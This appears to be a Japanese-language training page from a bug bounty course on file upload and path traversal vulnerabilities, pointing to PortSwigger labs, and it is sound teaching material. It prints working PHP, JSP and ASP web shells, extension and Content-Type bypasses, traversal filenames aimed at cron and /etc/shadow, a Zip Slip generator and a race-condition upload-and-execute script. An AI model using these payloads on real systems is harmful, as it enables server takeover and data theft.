@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Upload & Path Traversal - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 1: Core Vulnerabilities &gt; File Upload &amp; Path Traversal
+        </div>
+
+        <div class="page-header">
+            <h1>File Upload &amp; Path Traversal</h1>
+            <p class="subtitle">
+                ファイルアップロード機能の検証不備を悪用して Web Shell を配置し RCE を達成する。
+                Path Traversal と組み合わせて任意のパスにファイルを書き込む。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-wsa">WSA Lab</span>
+                <span class="tag tag-handson">Hands-on</span>
+            </div>
+        </div>
+
+        <!-- 原理 -->
+        <div class="section">
+            <h2>原理と仕組み</h2>
+            <p>
+                ファイルアップロードの脆弱性は、アプリケーションがアップロードされたファイルの
+                <strong>拡張子・Content-Type・内容</strong>を適切に検証せず、
+                サーバー側で実行可能なファイルとして保存・配信してしまう問題。
+            </p>
+            <p>
+                最悪のケース: Web Shell (.php, .jsp, .aspx) のアップロードによる RCE。
+            </p>
+
+            <div class="callout danger">
+                <div class="callout-title">Impact</div>
+                <p>
+                    ファイルアップロード→RCE は Critical。サーバーの完全な制御権を得られる。
+                    RCE に至らなくても、XSS (SVG/HTML アップロード)、DoS (大容量ファイル)、
+                    情報漏洩 (設定ファイル上書き) など複数の impact パスがある。
+                </p>
+            </div>
+        </div>
+
+        <!-- 種類 -->
+        <div class="section">
+            <h2>種類と分類</h2>
+
+            <h3>1. Web Shell Upload</h3>
+<pre><code>&lt;!-- 最小限の PHP Web Shell --&gt;
+&lt;?php system($_GET['cmd']); ?&gt;
+
+&lt;!-- JSP Web Shell --&gt;
+&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;
+
+&lt;!-- ASP Web Shell --&gt;
+&lt;%@ Page Language="C#" %&gt;
+&lt;% System.Diagnostics.Process.Start(Request["cmd"]); %&gt;
+
+&lt;!-- アップロード後のアクセス --&gt;
+https://target.com/uploads/shell.php?cmd=whoami</code></pre>
+
+            <h3>2. Content-Type Bypass</h3>
+<pre><code>// サーバーが Content-Type のみを検証する場合:
+POST /upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=----
+
+------
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/jpeg    ← 嘘の Content-Type
+
+&lt;?php system($_GET['cmd']); ?&gt;
+------</code></pre>
+
+            <h3>3. Extension Bypass</h3>
+<pre><code>// ブラックリストバイパス (.php を禁止している場合)
+shell.php5      // PHP 5 で実行
+shell.phtml     // PHP として実行
+shell.phar      // PHP アーカイブ
+shell.php.jpg   // double extension (Apache misconfiguration)
+shell.php%00.jpg  // null byte (古い PHP)
+shell.php;.jpg  // semicolon (IIS)
+shell.PhP       // case variation
+shell.php.     // trailing dot (Windows)
+shell.php::$DATA  // NTFS ADS (Windows/IIS)
+
+// Apache .htaccess upload
+AddType application/x-httpd-php .abc
+// → shell.abc が PHP として実行される</code></pre>
+
+            <h3>4. Magic Bytes (File Signature)</h3>
+<pre><code>// ファイルのマジックバイトを画像に偽装
+// GIF89a ヘッダー + PHP コード
+GIF89a
+&lt;?php system($_GET['cmd']); ?&gt;
+
+// JPEG ヘッダー + PHP (Exif comment に挿入)
+exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' image.jpg
+mv image.jpg image.php.jpg
+
+// PNG polyglot
+// PNG ヘッダーを保持しつつ PHP コードを含む</code></pre>
+
+            <h3>5. Path Traversal (Directory Traversal)</h3>
+<pre><code>// アップロード先ディレクトリの外にファイルを書き込む
+filename="../../../etc/cron.d/backdoor"
+filename="....//....//....//var/www/html/shell.php"
+
+// Windows
+filename="..\..\..\..\inetpub\wwwroot\shell.aspx"
+
+// URL エンコード
+filename="%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php"
+filename="..%252f..%252f..%252fshell.php"  // double encode
+
+// 読み取り (LFI)
+GET /download?file=../../../etc/passwd
+GET /image?path=....//....//....//etc/shadow</code></pre>
+
+            <h3>6. Zip Slip</h3>
+            <p>
+                ZIP アーカイブ内のファイル名に <code>../../</code> を含めることで、
+                展開時に任意のパスにファイルを書き込む。
+            </p>
+<pre><code># Zip Slip ペイロード作成
+import zipfile
+with zipfile.ZipFile('payload.zip', 'w') as z:
+    z.writestr('../../../var/www/html/shell.php',
+               '&lt;?php system($_GET["cmd"]); ?&gt;')</code></pre>
+
+            <h3>7. Symlink Attack</h3>
+<pre><code># tar に symlink を含める
+ln -s /etc/passwd link
+tar cf payload.tar link
+
+# 展開後、link 経由で /etc/passwd を読み取り可能
+# ZIP symlink
+# アプリが ZIP を展開して中身を表示する場合:
+# symlink → /etc/passwd を含む ZIP をアップロード</code></pre>
+        </div>
+
+        <!-- 検出方法 -->
+        <div class="section">
+            <h2>検出方法</h2>
+            <table>
+                <thead>
+                    <tr><th>テスト</th><th>手法</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>拡張子フィルタ</td><td>各種代替拡張子を試行</td></tr>
+                    <tr><td>Content-Type 検証</td><td>image/jpeg に偽装して .php アップロード</td></tr>
+                    <tr><td>ファイル内容検証</td><td>マジックバイト付加で検証回避</td></tr>
+                    <tr><td>保存パス</td><td>filename に ../ を含めてパス走査</td></tr>
+                    <tr><td>アップロード先 URL</td><td>アップロード後のファイルに直接アクセス</td></tr>
+                    <tr><td>サイズ制限</td><td>大容量ファイルで DoS テスト</td></tr>
+                    <tr><td>競合状態</td><td>アップロード→削除の間に実行</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- 防御と Bypass -->
+        <div class="section">
+            <h2>防御と Bypass</h2>
+
+            <h3>堅牢な防御</h3>
+            <ul>
+                <li><strong>ホワイトリスト方式</strong>: 許可する拡張子を明示的に列挙</li>
+                <li><strong>ファイル名の再生成</strong>: UUID 等でリネーム (元のファイル名を使わない)</li>
+                <li><strong>保存先の分離</strong>: Web root 外に保存、別ドメインから配信</li>
+                <li><strong>Content-Disposition: attachment</strong>: ブラウザでの実行を防止</li>
+                <li><strong>画像なら再エンコード</strong>: ImageMagick 等で再処理 (メタデータ除去)</li>
+                <li><strong>実行権限の除去</strong>: アップロードディレクトリの execute bit 無効化</li>
+            </ul>
+
+            <h3>Race Condition (Upload → Delete の隙)</h3>
+<pre><code># サーバーが「アップロード→検証→削除」の順で処理する場合
+# アップロードと同時にアクセスするレースコンディション
+
+# Turbo Intruder / threading
+import threading, requests
+
+def upload():
+    requests.post(url, files={'file': ('shell.php', payload)})
+
+def access():
+    r = requests.get('https://target.com/uploads/shell.php?cmd=id')
+    if 'uid=' in r.text:
+        print("RCE:", r.text)
+
+for _ in range(100):
+    threading.Thread(target=upload).start()
+    threading.Thread(target=access).start()</code></pre>
+        </div>
+
+        <!-- Practice -->
+        <div class="section">
+            <h2>Practice (WSA Labs)</h2>
+            <h3>PortSwigger Web Security Academy</h3>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload" target="_blank">Lab: Remote code execution via web shell upload</a></li>
+                <li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass" target="_blank">Lab: Web shell upload via Content-Type restriction bypass</a></li>
+                <li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal" target="_blank">Lab: Web shell upload via path traversal</a></li>
+                <li><a href="https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass" target="_blank">Lab: Web shell upload via extension blacklist bypass</a></li>
+                <li><a href="https://portswigger.net/web-security/file-path-traversal/lab-simple" target="_blank">Lab: File path traversal, simple case</a></li>
+            </ul>
+        </div>
+
+        <!-- Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>拡張子だけの検証は不十分</strong>: Content-Type、マジックバイト、実行権限の複合チェックが必要</li>
+                    <li><strong>ファイル名は再生成する</strong>: ユーザー提供のファイル名をそのまま使わない</li>
+                    <li><strong>Web root 外に保存</strong>: アップロードファイルに直接 URL でアクセスさせない</li>
+                    <li><strong>ZIP/TAR 展開は危険</strong>: Zip Slip と symlink attack を常に想定</li>
+                    <li><strong>Path Traversal + Upload = RCE</strong>: 最も直接的な攻撃パスの一つ</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/file-upload" target="_blank">PortSwigger - File Upload Vulnerabilities</a></li>
+                <li><a href="https://portswigger.net/web-security/file-path-traversal" target="_blank">PortSwigger - Path Traversal</a></li>
+                <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" target="_blank">OWASP - Unrestricted File Upload</a></li>
+                <li><a href="https://book.hacktricks.xyz/pentesting-web/file-upload" target="_blank">HackTricks - File Upload</a></li>
+                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank">PayloadsAllTheThings - Upload</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete Button -->
+        <div style="text-align:center; margin:2rem 0;">
+            <button class="complete-btn" data-module-id="16-upload" onclick="toggleComplete('16-upload')">Mark Complete</button>
+        </div>
+
+        <!-- Page Nav -->
+        <div class="page-nav">
+            <a href="15-csrf.html">&larr; Prev: CSRF</a>
+            <a href="17-xxe.html">Next: XXE &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
